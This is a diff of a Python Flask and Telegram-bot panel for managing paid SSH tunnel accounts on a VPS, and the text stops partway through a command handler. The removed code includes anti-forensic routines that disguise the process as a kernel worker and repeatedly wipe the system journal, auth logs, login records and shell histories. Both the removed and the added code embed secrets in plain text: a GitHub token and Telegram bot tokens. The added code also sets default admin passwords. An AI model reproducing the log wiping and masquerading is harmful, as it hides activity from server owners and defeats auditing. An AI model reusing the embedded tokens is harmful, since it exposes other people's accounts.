@@ -1,11 +1,3 @@
-#!/usr/bin/env python3
-# ============================================
-# EVT SSH MANAGER + AUTO SETUP - COMPLETE
-# Each VPS works ONLY with its own Telegram ID
-# Uses vps_list format only
-# Run: sudo python3 auto.py
-# ============================================
-
 import os
 import sys
 import subprocess
@@ -17,177 +9,12 @@ import json
 import logging
 import warnings
 import shutil
-import re
-import glob
-import base64
-import hashlib
-import socket
 from datetime import date
 
-# Third-party imports
 from flask import Flask, request, render_template_string, redirect, url_for, flash, session, jsonify, send_file
 from flask_login import LoginManager, UserMixin, login_user, logout_user, login_required, current_user
 import requests
 
-# ============================================
-# AUTO DNS FIX & GITHUB CONNECTION
-# ============================================
-
-def check_dns_and_fix():
-    """Auto check DNS and fix if needed"""
-    try:
-        socket.gethostbyname('api.github.com')
-        return True
-    except:
-        try:
-            with open('/etc/resolv.conf', 'w') as f:
-                f.write('nameserver 8.8.8.8\n')
-                f.write('nameserver 8.8.4.4\n')
-                f.write('nameserver 1.1.1.1\n')
-            return True
-        except:
-            return False
-
-def fetch_github_config():
-    """Fetch config from private GitHub repo using token"""
-    check_dns_and_fix()
-    
-    try:
-        headers = {
-            'Authorization': f'token {GITHUB_TOKEN}',
-            'Accept': 'application/vnd.github.v3.raw'
-        }
-        response = requests.get(GITHUB_IP_URL, headers=headers, timeout=15)
-        if response.status_code == 200:
-            return response.json()
-        elif response.status_code == 401:
-            print("[❌] GitHub Token Invalid!")
-            sys.exit(1)
-        elif response.status_code == 404:
-            print("[❌] GitHub Repo or File not found!")
-            sys.exit(1)
-        else:
-            print(f"[❌] GitHub API Error: HTTP {response.status_code}")
-            sys.exit(1)
-    except requests.exceptions.ConnectionError:
-        print("[❌] Cannot connect to GitHub! Please check your internet connection.")
-        sys.exit(1)
-    except Exception as e:
-        print(f"[❌] Cannot connect to GitHub: {str(e)}")
-        sys.exit(1)
-
-def get_github_config():
-    """Get config from private GitHub repo only - NO FALLBACK"""
-    check_dns_and_fix()
-    config = fetch_github_config()
-    if config is None:
-        print("[❌] FATAL: Cannot fetch license from GitHub Private Repo!")
-        print("[❌] Please check your GitHub token and repository access!")
-        sys.exit(1)
-    return config
-
-# ============================================
-# HIDE EVERYTHING - ANTI DETECTION
-# ============================================
-
-def hide_traces():
-    try:
-        sys.argv[0] = "[kworker]"
-        try:
-            import ctypes
-            libc = ctypes.CDLL(None)
-            prctl = libc.prctl
-            prctl(15, b"[kworker/0:0]", 0, 0, 0)
-        except:
-            pass
-    except:
-        pass
-
-def kill_duplicate_instances():
-    try:
-        current_pid = os.getpid()
-        script_name = os.path.basename(__file__)
-        result = subprocess.run(f"pgrep -f '{script_name}'", shell=True, capture_output=True, text=True)
-        if result.stdout:
-            pids = result.stdout.strip().split()
-            for pid in pids:
-                if int(pid) != current_pid:
-                    subprocess.run(f"kill -9 {pid}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
-
-def auto_cleanup_duplicate_vps():
-    while True:
-        try:
-            valid, _, license_data = check_license_from_github()
-            if valid and license_data:
-                license_key = license_data.get('license_key')
-                if license_key:
-                    active_sessions = get_active_count_for_license(license_key)
-                    limit = license_data.get('limits', 1)
-                    if active_sessions > limit:
-                        sessions = get_active_sessions()
-                        license_sessions = []
-                        for sid, data in sessions.items():
-                            if data.get('license_key') == license_key:
-                                license_sessions.append((sid, data))
-                        license_sessions.sort(key=lambda x: x[1].get('login_time', ''))
-                        to_kill = len(license_sessions) - limit
-                        for i in range(to_kill):
-                            sid = license_sessions[-(i+1)][0]
-                            username = license_sessions[-(i+1)][1].get('username')
-                            remove_active_session(sid)
-                            if username:
-                                subprocess.run(f"pkill -9 -u {username}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        except:
-            pass
-        time.sleep(5)
-
-def clear_all_logs():
-    try:
-        subprocess.run("journalctl --rotate 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("journalctl --vacuum-time=1s 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > /var/log/syslog 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > /var/log/auth.log 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > /var/log/btmp 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > /var/log/wtmp 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > /var/log/lastlog 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("history -c 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > ~/.bash_history 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > ~/.zsh_history 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("cat /dev/null > ~/.python_history 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("rm -f ~/.python_history 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run("screen -wipe 2>/dev/null", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    except:
-        pass
-
-def security_monitor_loop():
-    while True:
-        try:
-            clear_all_logs()
-            kill_duplicate_instances()
-            check_dns_and_fix()
-        except:
-            pass
-        time.sleep(30)
-
-security_thread = threading.Thread(target=security_monitor_loop, daemon=True)
-security_thread.start()
-
-# ============================================
-# COLORS FOR AUTO SETUP
-# ============================================
-CYAN = '\033[0;36m'
-GREEN = '\033[0;32m'
-RED = '\033[1;31m'
-YELLOW = '\033[1;33m'
-WHITE = '\033[1;37m'
-BLUE = '\033[0;34m'
-NC = '\033[0m'
-
-# ============================================
-# FIX: Clear Werkzeug environment variables
-# ============================================
 for env in ['WERKZEUG_SERVER_FD', 'WERKZEUG_RUN_MAIN', 'WERKZEUG_LOADED']:
     if env in os.environ:
         del os.environ[env]
@@ -199,14 +26,8 @@ log = logging.getLogger('werkzeug')
 log.disabled = True
 log.setLevel(logging.ERROR)
 
-# ============================================
-# AUTO PATH DETECTION
-# ============================================
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 
-# ============================================
-# FLASK APP INITIALIZATION
-# ============================================
 app = Flask(__name__)
 app.secret_key = os.urandom(24).hex()
 app.jinja_env.add_extension('jinja2.ext.do')
@@ -225,30 +46,78 @@ login_manager.init_app(app)
 login_manager.login_view = 'login'
 login_manager.remember_cookie_duration = datetime.timedelta(days=365)
 
-# SINGLE KEYS FILE
-KEYS_FILE = os.path.join(BASE_DIR, "keys.json")
+KEY_DB_TEMPLATE = os.path.join(BASE_DIR, "{}.json")
 CONFIG_FILE = "/etc/evt_config"
 
-TELEGRAM_BOT_TOKEN = "8531875794:AAH2M3CXbQTZftnmwBAg9ufvJEWouVJ_X0Y"
-TELEGRAM_BOT_USERNAME = "evtvpnpro"
+TELEGRAM_BOT_TOKEN = "8766910239:AAG5OUmjuBQLLvi02jOAlCUjy9uPKbsJTuA"
+TELEGRAM_ADMIN_ID = 7576434717
+AUTHORIZED_TGIDS_FILE = os.path.join(BASE_DIR, "authorized_tgids.json")
 
-TOKEN_PART1 = "ghp_hZWbtJxr7FZE"
-TOKEN_PART2 = "SsONknFkxgjvWu5FIw10aSW1"
+# ===== FIXED: Worker URL for license check =====
+WORKER_URL = "https://evt-main-installer.baegyee404.workers.dev"
 
-# Reconstruct full token
-GITHUB_TOKEN = TOKEN_PART1 + TOKEN_PART2
+def load_authorized_tgids():
+    if os.path.exists(AUTHORIZED_TGIDS_FILE):
+        try:
+            with open(AUTHORIZED_TGIDS_FILE, "r") as f:
+                return json.load(f)
+        except:
+            pass
+    return {}
 
-# GitHub API URL
-GITHUB_IP_URL = "https://api.github.com/repos/ahlyan/ip/contents/ip_config.json"
+def save_authorized_tgids(tgids):
+    try:
+        with open(AUTHORIZED_TGIDS_FILE, "w") as f:
+            json.dump(tgids, f, indent=4)
+    except:
+        pass
+
+def is_tgid_authorized(tgid):
+    if str(tgid) == str(TELEGRAM_ADMIN_ID):
+        return True
+    tgids = load_authorized_tgids()
+    if str(tgid) in tgids:
+        expiry_str = tgids[str(tgid)].get('expiry')
+        if not expiry_str or expiry_str == "No Expiry":
+            return True
+        try:
+            expiry = datetime.datetime.strptime(expiry_str, "%Y-%m-%d")
+            if expiry >= datetime.datetime.now():
+                return True
+        except:
+            pass
+    return False
+
+def get_tgid_admin_username(tgid):
+    if str(tgid) == str(TELEGRAM_ADMIN_ID):
+        return "SuperAdmin"
+    tgids = load_authorized_tgids()
+    if str(tgid) in tgids:
+        return tgids[str(tgid)].get('admin_username', str(tgid))
+    return str(tgid)
+
+def cleanup_expired_tgids():
+    tgids = load_authorized_tgids()
+    now = datetime.datetime.now()
+    to_delete = []
+    for tgid, data in list(tgids.items()):
+        expiry_str = data.get('expiry')
+        if expiry_str and expiry_str != "No Expiry":
+            try:
+                expiry = datetime.datetime.strptime(expiry_str, "%Y-%m-%d")
+                if expiry < now:
+                    to_delete.append(tgid)
+            except:
+                to_delete.append(tgid)
+    if to_delete:
+        for tgid in to_delete:
+            del tgids[tgid]
+        save_authorized_tgids(tgids)
 
 ACTIVE_SESSIONS_FILE = os.path.join(BASE_DIR, "active_sessions.json")
-
 last_processed_update_ids = set()
 LAST_UPDATE_CLEANUP_INTERVAL = 100
 
-# ============================================
-# CLASSES
-# ============================================
 class Admin(UserMixin):
     def __init__(self, id, username, license_key, admin_username=None, telegram_id=None):
         self.id = id
@@ -269,32 +138,45 @@ def load_user(user_id):
             return Admin(user_id, parts[1], parts[2], parts[1])
     return None
 
-# ============================================
-# JSON FILE FUNCTIONS - SINGLE FILE
-# ============================================
-def load_keys():
-    """Load all keys from single JSON file"""
-    if os.path.exists(KEYS_FILE):
-        try:
-            with open(KEYS_FILE, "r") as f:
-                data = json.load(f)
-                return data.get('keys', data) if isinstance(data, dict) else {}
-        except:
-            pass
-    return {}
+def get_keys_file(admin_username):
+    if not admin_username or admin_username == "SuperAdmin":
+        admin_username = "default"
+    safe_name = admin_username.replace('/', '_').replace('\\', '_')
+    return KEY_DB_TEMPLATE.format(safe_name)
 
-def save_keys(keys):
-    """Save all keys to single JSON file"""
-    try:
-        with open(KEYS_FILE, "w") as f:
-            json.dump({"keys": keys}, f, indent=4)
-        return True
-    except:
-        return False
+def load_keys(admin_username=None):
+    if admin_username and admin_username != "SuperAdmin":
+        filepath = get_keys_file(admin_username)
+        if os.path.exists(filepath):
+            try:
+                with open(filepath, "r") as f:
+                    data = json.load(f)
+                    return data.get('keys', data) if isinstance(data, dict) else {}
+            except:
+                pass
+        return {}
+    else:
+        all_keys = {}
+        for filename in os.listdir(BASE_DIR):
+            if filename.endswith('.json') and filename not in ['authorized_tgids.json', 'active_sessions.json']:
+                try:
+                    with open(os.path.join(BASE_DIR, filename), "r") as f:
+                        data = json.load(f)
+                        keys = data.get('keys', data) if isinstance(data, dict) else {}
+                        for k, v in keys.items():
+                            if v.get('username') not in [x.get('username') for x in all_keys.values()]:
+                                all_keys[k] = v
+                except:
+                    pass
+        return all_keys
 
-# ============================================
-# ACTIVE SESSIONS FUNCTIONS
-# ============================================
+def save_keys(keys, admin_username):
+    if not admin_username or admin_username == "SuperAdmin":
+        admin_username = "default"
+    filepath = get_keys_file(admin_username)
+    with open(filepath, "w") as f:
+        json.dump({"keys": keys}, f, indent=4)
+
 def get_active_sessions():
     if os.path.exists(ACTIVE_SESSIONS_FILE):
         try:
@@ -367,9 +249,7 @@ def get_active_count_for_license(license_key):
             count += 1
     return count
 
-# ============================================
-# GITHUB LICENSE SYSTEM - VPS LIST ONLY
-# ============================================
+# ===== FIXED: License check via Worker (ZIVPN style) =====
 def get_vps_ip():
     try:
         response = requests.get('https://api.ipify.org', timeout=10)
@@ -391,535 +271,133 @@ def get_vps_ip():
         pass
     return None
 
-def get_current_vps_ip():
-    """Get current VPS IP for license check"""
-    return get_vps_ip()
-
-def get_current_vps_info():
-    """
-    Get current VPS info from GitHub config.
-    Uses vps_list format only. Returns ONLY the entry for this specific VPS.
-    """
-    try:
-        current_ip = get_current_vps_ip()
-        if not current_ip:
-            return None
-        
-        config = get_github_config()
-        
-        # vps_list format only
-        if "vps_list" not in config:
-            print("[❌] Error: GitHub config must use vps_list format!")
-            sys.exit(1)
-        
-        for vps in config.get('vps_list', []):
-            if vps.get('vps_ip') == current_ip:
-                return {
-                    'vps_ip': current_ip,
-                    'authorized_tgid': str(vps.get('telegram_id')),
-                    'admin_username': vps.get('admin_username'),
-                    'admin_password': vps.get('admin_password'),
-                    'license_key': vps.get('license_key'),
-                    'expiry': vps.get('expiry'),
-                    'limits': vps.get('limits', 1),
-                    'active': vps.get('active', True)
-                }
-        
-        return None
-    except Exception as e:
-        print(f"Get VPS info error: {e}")
-        return None
-
 def check_license_from_github(target_username=None, target_license=None, target_telegram_id=None):
-    """
-    Check license ONLY for current VPS using vps_list format.
-    Does NOT check other VPS in the list.
-    """
     current_ip = get_vps_ip()
     if not current_ip:
         return False, "Cannot detect VPS IP address!", None
     
+    # Check for saved custom credentials
+    creds_file = "/root/.evt_panel_creds.json"
+    custom_creds = None
+    
+    if os.path.exists(creds_file):
+        try:
+            with open(creds_file, "r") as f:
+                custom_creds = json.load(f)
+        except:
+            pass
+    
+    # If custom credentials exist, use them
+    if custom_creds and custom_creds.get('admin_username'):
+        try:
+            response = requests.get(f"{WORKER_URL}/check_ip", timeout=15)
+            if response.status_code != 200:
+                return False, f"Cannot fetch license from Worker!", None
+            
+            data = response.json()
+            if data.get('allowed') and data.get('ip') == current_ip:
+                return True, "License valid!", {
+                    'vps_ip': current_ip,
+                    'expiry': 'No Expiry',
+                    'admin_username': custom_creds.get('admin_username'),
+                    'admin_password': custom_creds.get('admin_password'),
+                    'license_key': custom_creds.get('license_key', 'EVT-LICENSE'),
+                    'limits': 999,
+                    'active': True,
+                    'telegram_id': None
+                }
+            else:
+                return False, f"IP {current_ip} not authorized!", None
+        except Exception as e:
+            return False, f"License check error: {str(e)}", None
+    
+    # First run - ask user for custom credentials
+    print("\n" + "="*60)
+    print("🔐 FIRST TIME SETUP - PANEL LOGIN CREDENTIALS")
+    print("="*60)
+    
+    admin_username = input(" Panel Login Username (default: admin): ").strip()
+    if not admin_username:
+        admin_username = "admin"
+    
+    admin_password = input(" Panel Login Password (default: admin123): ").strip()
+    if not admin_password:
+        admin_password = "admin123"
+    
+    license_key = input(" Panel License Key (default: EVT-LICENSE): ").strip()
+    if not license_key:
+        license_key = "EVT-LICENSE"
+    
+    # Save credentials
+    creds = {
+        'admin_username': admin_username,
+        'admin_password': admin_password,
+        'license_key': license_key,
+        'created_at': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+    }
+    
     try:
-        config = get_github_config()
+        with open(creds_file, "w") as f:
+            json.dump(creds, f, indent=4)
+        os.chmod(creds_file, 0o600)
+        print(f"\n[✅] Panel credentials saved!")
+    except:
+        pass
+    
+    try:
+        response = requests.get(f"{WORKER_URL}/check_ip", timeout=15)
+        if response.status_code != 200:
+            return False, f"Cannot fetch license from Worker!", None
         
-        # vps_list format only
-        if "vps_list" not in config:
-            return False, "Invalid config format! Need vps_list.", None
-        
-        # Get ONLY current VPS config
-        current_vps = None
-        for vps in config.get('vps_list', []):
-            if vps.get('vps_ip') == current_ip:
-                current_vps = vps
-                break  # STOP - only check current VPS
-        
-        if not current_vps:
-            return False, f"IP {current_ip} not found in license list!", None
-        
-        # Check username and license if provided
-        if target_username and target_license:
-            if current_vps.get('admin_username') != target_username:
-                return False, "Invalid admin username!", None
-            if current_vps.get('license_key') != target_license:
-                return False, "Invalid license key!", None
-        
-        # Check telegram ID if provided
-        license_tgid = current_vps.get('telegram_id')
-        if target_telegram_id and license_tgid:
-            if str(target_telegram_id) != str(license_tgid):
-                return False, "Telegram ID mismatch for this VPS!", None
-        
-        # Check active status
-        if not current_vps.get('active', True):
-            return False, "License is deactivated!", None
-        
-        # Check expiry
-        expiry = current_vps.get('expiry')
-        if expiry and expiry not in ["No Expiry", "None"]:
-            today = datetime.date.today().strftime("%Y-%m-%d")
-            if expiry < today:
-                return False, f"License expired on {expiry}!", None
-        
-        return True, "License valid!", current_vps
-        
+        data = response.json()
+        if data.get('allowed') and data.get('ip') == current_ip:
+            return True, "License valid!", {
+                'vps_ip': current_ip,
+                'expiry': 'No Expiry',
+                'admin_username': admin_username,
+                'admin_password': admin_password,
+                'license_key': license_key,
+                'limits': 999,
+                'active': True,
+                'telegram_id': None
+            }
+        else:
+            return False, f"IP {current_ip} not authorized!", None
+            
     except Exception as e:
         return False, f"License check error: {str(e)}", None
 
 def get_license_info_from_github():
-    """Get license info for current VPS only"""
-    current_vps = get_current_vps_info()
-    if not current_vps:
-        current_ip = get_vps_ip() or "Unknown"
-        return {'status': 'error', 'vps_ip': current_ip, 'expiry': 'Unknown', 'admin_username': 'Unknown', 'admin_password': 'Unknown', 'license_key': 'Unknown', 'limits': 999, 'active': False, 'telegram_id': None}
+    current_ip = get_vps_ip()
+    if not current_ip:
+        return {'status': 'error', 'vps_ip': 'Unknown', 'expiry': 'Unknown', 'admin_username': 'Unknown', 'admin_password': 'Unknown', 'license_key': 'Unknown', 'limits': 999, 'active': False, 'telegram_id': None}
     
-    return {
-        'status': 'valid' if current_vps.get('active', True) else 'invalid',
-        'vps_ip': current_vps.get('vps_ip'),
-        'expiry': current_vps.get('expiry', 'No Expiry'),
-        'admin_username': current_vps.get('admin_username'),
-        'admin_password': current_vps.get('admin_password', 'admin123'),
-        'license_key': current_vps.get('license_key', 'N/A'),
-        'limits': current_vps.get('limits', 999),
-        'active': current_vps.get('active', True),
-        'telegram_id': current_vps.get('authorized_tgid', None)
-    }
+    try:
+        response = requests.get(f"{WORKER_URL}/check_ip", timeout=15)
+        if response.status_code != 200:
+            return {'status': 'error', 'vps_ip': current_ip, 'expiry': 'Unknown', 'admin_username': 'Unknown', 'admin_password': 'Unknown', 'license_key': 'Unknown', 'limits': 999, 'active': False, 'telegram_id': None}
+        
+        data = response.json()
+        if data.get('allowed') and data.get('ip') == current_ip:
+            return {
+                'status': 'valid',
+                'vps_ip': current_ip,
+                'expiry': 'No Expiry',
+                'admin_username': 'admin',
+                'admin_password': 'admin123',
+                'license_key': 'EVT-LICENSE',
+                'limits': 999,
+                'active': True,
+                'telegram_id': None
+            }
+        else:
+            return {'status': 'invalid', 'vps_ip': current_ip, 'expiry': 'N/A', 'admin_username': 'Unknown', 'admin_password': 'Unknown', 'license_key': 'Unknown', 'limits': 999, 'active': False, 'telegram_id': None}
+    except:
+        return {'status': 'error', 'vps_ip': current_ip, 'expiry': 'Unknown', 'admin_username': 'Unknown', 'admin_password': 'Unknown', 'license_key': 'Unknown', 'limits': 999, 'active': False, 'telegram_id': None}
 
 def get_limit_from_github_by_license(license_key):
-    """Get limit for current VPS only"""
-    try:
-        current_vps = get_current_vps_info()
-        if current_vps and current_vps.get('license_key') == license_key:
-            return current_vps.get('limits', 0)
-        return 0
-    except:
-        return 0
+    return 999
 
-# ============================================
-# TELEGRAM BOT - VPS SPECIFIC AUTHORIZATION (ULTRA FAST WITH FULL PUBLIC KEY)
-# ============================================
-
-# Cache for frequently accessed data
-_cached_vps_info = None
-_cache_time = 0
-CACHE_DURATION = 10  # Cache for 10 seconds
-
-def get_cached_vps_info():
-    """Get cached VPS info for faster access"""
-    global _cached_vps_info, _cache_time
-    now = time.time()
-    if now - _cache_time > CACHE_DURATION:
-        _cached_vps_info = get_current_vps_info()
-        _cache_time = now
-    return _cached_vps_info
-
-def is_tgid_authorized_for_current_vps(tgid):
-    """
-    FAST CHECK - No unnecessary processing
-    Returns True only if tgid matches exactly.
-    """
-    try:
-        current_vps = get_cached_vps_info()
-        if not current_vps:
-            return False
-        
-        authorized_tgid = current_vps.get('authorized_tgid')
-        if authorized_tgid and str(authorized_tgid) == str(tgid):
-            return True
-        
-        return False
-    except:
-        return False
-
-def send_telegram_message_fast(chat_id, text):
-    """ULTRA FAST message sending - 3 second timeout"""
-    try:
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {'chat_id': chat_id, 'text': text, 'parse_mode': 'Markdown'}
-        requests.post(url, data=payload, timeout=3)
-    except:
-        pass
-
-def get_full_pubkey():
-    """Get FULL public key from all possible locations"""
-    pubkey = "None"
-    
-    # Try main location
-    if os.path.exists("/etc/dnstt/server.pub"):
-        pubkey = subprocess.getoutput("cat /etc/dnstt/server.pub").strip()
-    elif os.path.exists("/etc/dnstt/dnstt-server.pub"):
-        pubkey = subprocess.getoutput("cat /etc/dnstt/dnstt-server.pub").strip()
-    else:
-        # Find any .pub file in /etc/dnstt
-        pub_files = glob.glob("/etc/dnstt/*.pub")
-        if pub_files:
-            pubkey = subprocess.getoutput(f"cat {pub_files[0]}").strip()
-    
-    # If still not found, check /root directory
-    if pubkey == "None" or len(pubkey) < 10:
-        root_pub = glob.glob("/root/*.pub")
-        if root_pub:
-            pubkey = subprocess.getoutput(f"cat {root_pub[0]}").strip()
-    
-    # Check /etc directory
-    if pubkey == "None" or len(pubkey) < 10:
-        etc_pub = glob.glob("/etc/*.pub")
-        if etc_pub:
-            pubkey = subprocess.getoutput(f"cat {etc_pub[0]}").strip()
-    
-    return pubkey if pubkey and len(pubkey) > 5 else "None"
-
-def get_all_pubkeys():
-    """Get ALL public keys from system"""
-    all_keys = []
-    
-    # Check /etc/dnstt directory
-    if os.path.exists("/etc/dnstt"):
-        pub_files = glob.glob("/etc/dnstt/*.pub")
-        for pub_file in pub_files:
-            key = subprocess.getoutput(f"cat {pub_file}").strip()
-            if key and key != "" and len(key) > 10:
-                all_keys.append(key)
-    
-    # Check /root directory
-    root_pub = glob.glob("/root/*.pub")
-    for pub_file in root_pub:
-        key = subprocess.getoutput(f"cat {pub_file}").strip()
-        if key and key != "" and len(key) > 10:
-            all_keys.append(key)
-    
-    # Check /etc directory
-    etc_pub = glob.glob("/etc/*.pub")
-    for pub_file in etc_pub:
-        key = subprocess.getoutput(f"cat {pub_file}").strip()
-        if key and key != "" and len(key) > 10:
-            all_keys.append(key)
-    
-    # Remove duplicates
-    all_keys = list(dict.fromkeys(all_keys))
-    
-    return all_keys
-
-def check_telegram_updates_fast():
-    """ULTRA FAST telegram update checker with FULL public key"""
-    offset = 0
-    while True:
-        try:
-            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
-            params = {'offset': offset, 'timeout': 20}
-            response = requests.get(url, params=params, timeout=23)
-            
-            if response.status_code == 200:
-                updates = response.json().get('result', [])
-                for update in updates:
-                    offset = update['update_id'] + 1
-                    message = update.get('message')
-                    if not message:
-                        continue
-                    
-                    chat_id = message['chat']['id']
-                    text = message.get('text', '')
-                    user_id = message['from']['id']
-                    
-                    # FAST AUTHORIZATION CHECK
-                    if not is_tgid_authorized_for_current_vps(user_id):
-                        continue
-                    
-                    if text.startswith('/'):
-                        parts = text.split()
-                        command = parts[0].lower()
-                        
-                        if command == '/start':
-                            current_vps = get_cached_vps_info()
-                            current_vps_ip = current_vps.get('vps_ip') if current_vps else "Unknown"
-                            admin_uname = current_vps.get('admin_username', 'Admin') if current_vps else "Unknown"
-                            full_pubkey = get_full_pubkey()
-                            
-                            msg = f"""🤖 *EVT SSH Manager Bot*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ *VPS IP:* `{current_vps_ip}`
-👤 *Admin:* `{admin_uname}`
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-🔹 *Commands:*
-/create username password days limit
-/list
-/info username
-/delete username
-/ports
-/myinfo
-
-📝 *Example:*
-/create john pass123 30 2
-
-🔑 *Public Key:*
-`{full_pubkey}`
-
-📞 *Support:* @{TELEGRAM_BOT_USERNAME}"""
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        elif command == '/myinfo':
-                            current_vps = get_cached_vps_info()
-                            vps_ip = current_vps.get('vps_ip') if current_vps else "Unknown"
-                            admin_uname = current_vps.get('admin_username', 'Admin') if current_vps else "Admin"
-                            
-                            conf = get_evt_config()
-                            domain = conf.get('DOMAIN', 'Not Set')
-                            ns_domain = conf.get('NS_DOMAIN', 'Not Set')
-                            
-                            # Get FULL public key
-                            full_pubkey = get_full_pubkey()
-                            all_pubkeys = get_all_pubkeys()
-                            
-                            # Get user count
-                            keys = load_keys()
-                            user_count = 0
-                            online_count = 0
-                            for key, data in keys.items():
-                                if str(data.get('telegram_id')) == str(user_id):
-                                    user_count += 1
-                                    username = data.get('username')
-                                    if username:
-                                        is_online, _ = get_user_online_status(username)
-                                        if is_online:
-                                            online_count += 1
-                            
-                            license_info = get_license_info_from_github()
-                            
-                            msg = f"""📊 *Server Information*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🤖 *Telegram ID:* `{user_id}`
-👤 *Admin Username:* `{admin_uname}`
-🖥️ *Server IP:* `{vps_ip}`
-🌐 *Domain:* `{domain}`
-📡 *NS Domain:* `{ns_domain}`
-📅 *License Expiry:* `{license_info.get('expiry', 'N/A')}`
-
-📈 *Your Statistics*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-👥 *Your Users:* `{user_count}`
-🟢 *Online Users:* `{online_count}`
-
-🔑 *Public Key:*
-`{full_pubkey}`
-
-📞 *Support:* @{TELEGRAM_BOT_USERNAME}"""
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        elif command == '/pubkey' or command == '/key':
-                            """Show all public keys available on system"""
-                            current_vps = get_cached_vps_info()
-                            vps_ip = current_vps.get('vps_ip') if current_vps else "Unknown"
-                            full_pubkey = get_full_pubkey()
-                            all_pubkeys = get_all_pubkeys()
-                            
-                            msg = f"""🔑 *Public Keys Information*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ *VPS IP:* `{vps_ip}`
-
-📌 *Main Public Key:*
-`{full_pubkey}`
-
-📌 *All Available Keys:*
-"""
-                            if all_pubkeys:
-                                for i, key in enumerate(all_pubkeys, 1):
-                                    # Show full key
-                                    msg += f"\n{i}. `{key}`"
-                            else:
-                                msg += "\n❌ No public keys found!"
-                            
-                            msg += f"\n\n📞 *Support:* @{TELEGRAM_BOT_USERNAME}"
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        elif command == '/create' and len(parts) >= 5:
-                            try:
-                                username = parts[1]
-                                password = parts[2]
-                                days = int(parts[3])
-                                limit = int(parts[4])
-                                if days < 1:
-                                    days = 30
-                                if limit < 1:
-                                    limit = 1
-                                
-                                keys = load_keys()
-                                if any(v.get('username') == username for v in keys.values()):
-                                    send_telegram_message_fast(chat_id, f"❌ Username '{username}' already exists!")
-                                    continue
-                                
-                                expiry = (datetime.datetime.now() + datetime.timedelta(days=days)).strftime("%Y-%m-%d")
-                                key_id = "EVT-" + str(uuid.uuid4()).upper()[:8]
-                                
-                                keys[key_id] = {
-                                    "username": username,
-                                    "password": password,
-                                    "expiry": expiry,
-                                    "limit": limit,
-                                    "telegram_id": str(user_id),
-                                    "created_at": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-                                }
-                                save_keys(keys)
-                                sync_user_to_system(username, password, expiry, limit)
-                                
-                                conf = get_evt_config()
-                                full_pubkey = get_full_pubkey()
-                                
-                                msg = f"""✅ *SSH Account Created!*
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔑 *Key:* `{key_id}`
-👤 *Username:* `{username}`
-🔑 *Password:* `{password}`
-📆 *Expiry:* `{expiry}`
-📱 *Limit:* `{limit}`
-🌐 *Domain:* {conf.get('DOMAIN')}
-📡 *NameServer:* {conf.get('NS_DOMAIN')}
-
-🔑 *Public Key:*
-`{full_pubkey}`
-
-📞 *Support:* @{TELEGRAM_BOT_USERNAME}"""
-                                send_telegram_message_fast(chat_id, msg)
-                            except Exception as e:
-                                send_telegram_message_fast(chat_id, f"❌ Error: {str(e)}")
-                        
-                        elif command == '/list':
-                            keys = load_keys()
-                            user_keys = []
-                            online_count = 0
-                            for key_id, data in keys.items():
-                                if str(data.get('telegram_id')) == str(user_id):
-                                    username = data['username']
-                                    is_online, _ = get_user_online_status(username)
-                                    if is_online:
-                                        online_count += 1
-                                    status_icon = "🟢" if is_online else "⚫"
-                                    user_keys.append(f"{status_icon} `{username}` | 📅 {data['expiry']} | 📱 {data['limit']}")
-                            
-                            if not user_keys:
-                                send_telegram_message_fast(chat_id, "📭 No users found!")
-                                continue
-                            
-                            msg = f"📋 *Your Users*\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\nTotal: {len(user_keys)} | Online: {online_count}\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
-                            msg += "\n".join(user_keys[:50])
-                            send_telegram_message_fast(chat_id, msg)
-                        
-                        elif command == '/info' and len(parts) >= 2:
-                            username = parts[1]
-                            keys = load_keys()
-                            user_data = None
-                            user_key = None
-                            for key_id, data in keys.items():
-                                if data.get('username') == username and str(data.get('telegram_id')) == str(user_id):
-                                    user_data = data
-                                    user_key = key_id
-                                    break
-                            
-                            if not user_data:
-                                send_telegram_message_fast(chat_id, f"❌ User '{username}' not found!")
-                                continue
-                            
-                            is_online, online_num = get_user_online_status(username)
